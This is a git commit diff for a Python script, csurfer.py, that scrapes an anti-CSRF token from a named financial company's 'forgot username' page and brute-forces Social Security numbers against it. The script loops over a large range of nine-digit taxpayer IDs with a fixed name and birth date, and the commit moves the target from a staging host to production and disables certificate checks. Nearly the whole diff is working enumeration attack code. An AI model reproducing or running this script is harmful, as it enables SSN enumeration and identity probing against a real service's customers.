d028ed90993a3cf413953d087e6b622a3a7a1af8
mblange <mblange@users.noreply.github.com>
2016-08-08 20:49:57 -0500

    added main()

--- csurfer.py
+++ csurfer.py
@@ -12,42 +12,50 @@ except ImportError, e:
 	print "Exception: {}".format(str(e))
 	exit(1)
 
-# establish vars
-url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
-token = str()
-proxies = { 'https': 'http://172.21.22.204:8080' }	#for testing
-# TODO: this causes a python 'MemoryError' ssn = range(111111111, 888888888) 
-
-def get_token():
-    global token
-    global s
-    # establish session
-    s = requests.Session()
+def get_token(session, url):
     # make initial request to get token
-    gr = s.get(url, proxies=proxies, verify=False)
+    gr = session.get(url, verify=False)
     # access response and retrieve anti-csurf token
     tree = lh.fromstring(gr.content)
     token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
-    return token, s
+    return token
 
 # POST SSN request with token
 ## TODO: add ssn range as argument to post_ssn function
-def post_ssn():
-    global location
-    global pr
-    pr = s.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False) 
+def post_ssn(session, url, data):
+    pr = session.post(url, data=data, verify=False, allow_redirects=False) 
     try:
         location = pr.headers['Location']
-        if location != 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameFailure.do':
+        #if location != 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameFailure.do':
+        if location != 'https://service.northwesternmutual.com/CXID/forgotUserNameFailure.do':
             print 'SSN found: ' ## TODO add in with argument ## %s' %(ssn)
         else:
-            return location
+            print 'Bad SSN: %s' %data['taxPayerId']
+            print pr.status_code, pr.headers['location']
     except:
         location = "No 'Location' Header was returned by the server"
-        return pr
 
-if not token:
-    get_token()
-data = {'org.apache.struts.taglib.html.TOKEN':token, 'firstName':'matt', 'lastName':'lange', 'clientDOB':'1%2F1%2F2000','taxPayerId':'123456789', 'emailAddress':'matt%40matt.com'}
-post_ssn() 
-print location
+def main():
+    # establish vars
+    #url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
+    url = 'https://service.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
+    token = str()
+    #proxies = { 'https': 'http://172.21.22.204:8080' }	#for testing
+
+    # establish session
+    s = requests.Session()
+
+    if not token:
+        token = get_token(s, url)
+
+    for i in xrange(342356633, 444444444):
+        data = {'org.apache.struts.taglib.html.TOKEN':token,
+                'firstName':'matt',
+                'lastName':'lange',
+                'clientDOB':'1%2F1%2F2000',
+                'taxPayerId':str(i),
+                'emailAddress':'matt%40matt.com'}
+        post_ssn(s, url, data) 
+
+if __name__ == '__main__':
+    main()
